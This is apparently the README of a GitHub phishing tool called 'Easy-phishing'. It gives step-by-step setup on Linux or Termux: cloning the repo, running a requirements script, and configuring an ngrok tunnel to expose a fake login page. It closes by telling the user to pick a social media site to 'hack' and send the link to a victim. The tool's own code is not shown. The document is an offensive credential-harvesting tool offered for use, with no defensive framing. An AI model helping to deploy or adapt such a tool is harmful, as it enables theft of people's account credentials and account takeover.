# Easy-phishing
# Introduction
<h4>Hi this tool is used to social media credential harversting</h4>

# Screenshot
<img src="https://raw.githubusercontent.com/yuvarajucet/easy-phishing/main/Easyphishing.png"/>

# Pre-Requirement
<ul>
  <li>git</li>
</ul>

# Requirement
<ul>
  <li>Android or Linux</li>
  <li>wget (For download requirements)</li>
  <li>php (create a localhost)</li>
  <li>ngrok (Create tunnel for WAN access)</li>
  <li>Curl (Grep the Phishing link)</li>
  <li>unzip (Extract a downloaded package)</li>
</ul> 

# Tested Platform
<ul>
  <li>Android (Termux)</li>
  <li>Linux</li>
</ul>
  
# Installation
<p> When you use <b>linux</b> run this commands on your terminal. Suppose you use Android Device you need to download <b>Termux</b> <a href="https://play.google.com/store/apps/details?id=com.termux"> Get Here </a> and download git in termux</p>
  <ul>
  <li>pkg upgrade</li>
  <li>apt-get install git</li>
  </ul>
<h4>Step 1 :</h4>

```
git clone https://github.com/yuvarajucet/Easy-phishing.git
```
<h4>Step 2 :</h4>

```
cd Easy-phishing
```
<h4>Step 3 :</h4>

```
chmod +x requirements.sh
```
<h4>Step 4 :</h4>

```
./requirements.sh #(This script will download needed tools, So you press Y for all, Otherwise the tool will not work properly)
```
<h4>Step 5 :</h4>
<ul>
<h3> Ngrok</h3>
<h5>Step 1:</h5>
<p>You Need to run ngrok first need to configure Authentication Token from ngrok <a href="https://dashboard.ngrok.com/signup">Register Here</a> You can use google account to register and login</p>
<h5>Step 2:</h5>
<p>Now goto Dashboard and you see 2nd point that is your Authenticaiton Token, Copy that.</p>
<h5>Step 3:</h5>
<p>Paste your authtoken it seem like this</p>

```./ngrok authtoken <Your Token> ```
<h5>Step 4:</h5>
<p>Now run the script</p>
</ul>
<h4>Step 6 :</h4>
<p>Now Select the social media to hack. and your Phishing link will ready in 10sec</p>
<p>Send this link to Victim.</p>
<h1>BOOOOOM </h1>
